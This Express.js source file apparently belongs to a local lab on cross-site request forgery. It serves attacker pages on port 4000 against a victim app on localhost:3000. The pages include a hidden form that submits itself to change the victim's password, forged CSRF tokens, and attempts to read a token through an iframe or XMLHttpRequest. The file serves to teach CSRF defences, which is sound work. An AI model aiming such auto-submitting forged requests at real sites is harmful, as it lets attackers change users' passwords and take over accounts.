import expressServer from "express";
const app = expressServer();

const ORIGIN_BASE_URL = "http://localhost:3000";

app.get("/3-post-password-change-dangerous", (_req, res) => {
  res.send(`
  <form id="form" action="${ORIGIN_BASE_URL}/3-post-password-change-dangerous" method="post" style="display: none;">
  <input name="newPassword" type=text value="aaaaaaa"></input>
  <button type="submit">submit</buttion>
  </form>
  <script>
      const form = document.getElementById("form")
      form.submit()
  </script>
`);
});

app.get("/3-post-password-change-csrf-token", (_req, res) => {
  res.send(`
  <form id="form" action="${ORIGIN_BASE_URL}/3-post-password-change-csrf-token" method="post" style="display: none;">
  <input name="newPassword" type="text" value="aaaaaaa"></input>
  <input name="csrfToken" type="hidden" value="aaaaaaa"></input>
  <button type="submit">submit</buttion>
  </form>
  <script>
      const form = document.getElementById("form")
      form.submit()
  </script>
`);
});

app.get("/3-post-password-change-with-iframe", (_req, res) => {
  res.send(`
    <iframe id="inlineFrame"
        width="400"
        height="300"
        src="${ORIGIN_BASE_URL}/3-post-password-change-csrf-token">
    </iframe>
    <form id="form" action="${ORIGIN_BASE_URL}/3-post-password-change-csrf-token/" method="post" style="display: none;">
    <input name="newPassword" type="text" value="aaaaaaa"></input>
    <input name="csrfToken" type="hidden" value="aaaaaaa"></input>
    <button type="submit">submit</buttion>
    </form>
    <script>
        const iframe = document.getElementById("inlineFrame")
        console.log("try to load iframe content via js")
        iframe.contentWindow.onload = () => {
            console.log(iframe.contentWindow.document)
            const csrfToken = iframe.contentWindow.document.getElementsByName("csrfToken")[0]
            console.log(csrfToken)
        }
    </script>
  `);
});

app.get("/3-post-password-change-with-xml-http-request", (_req, res) => {
  res.send(`
    <form id="form" action="${ORIGIN_BASE_URL}/3-post-password-change-csrf-token" method="post" style="display: none;">
    <input name="newPassword" type="text" value="aaaaaaa"></input>
    <input name="csrfToken" type="hidden" value="aaaaaaa"></input>
    <button type="submit">submit</buttion>
    </form>
    <script>
        const req = new XMLHttpRequest();
        req.open("GET", "${ORIGIN_BASE_URL}/3-post-password-change-csrf-token")
        req.onreadystatechange = () => {
          if(req.readyState === XMLHttpRequest.DONE) {
            console.log("status: " + req.status)
            console.log("response: " + req.responseText)
          }
        }
        req.send()
    </script>
  `);
});

app.get("/4-prepare-check-referer-or-origin-or-metadata", (_req, res) => {
  res.send(
    `<form action="http://localhost:3000/4-prepare-check-headers" method="post">
      <button type="submit">submit</buttion>
    </form>`
  );
});

app.get("/4-prepare-custom-header", (_req, res) => {
  res.send(
    `
      <button id="button">submit</button>
      <p id="response"></p>
      <script>
          const button = document.getElementById("button")
          button.addEventListener("click", () => {
              const req = new XMLHttpRequest();
              req.open("POST", "${ORIGIN_BASE_URL}/4-prepare-check-headers")
              req.setRequestHeader("x-powered-by-myapp", "myapp")
              req.onreadystatechange = () => {
                  if(req.readyState === XMLHttpRequest.DONE) {
                      console.log("status: " + req.status)
                      console.log("response: " + req.responseText)
                      document.getElementById("response").innerText = req.responseText
                  }
              }
              req.send()
          })
      </script>
    `
  );
});

console.log("app listening on port: 4000");
app.listen(4000);
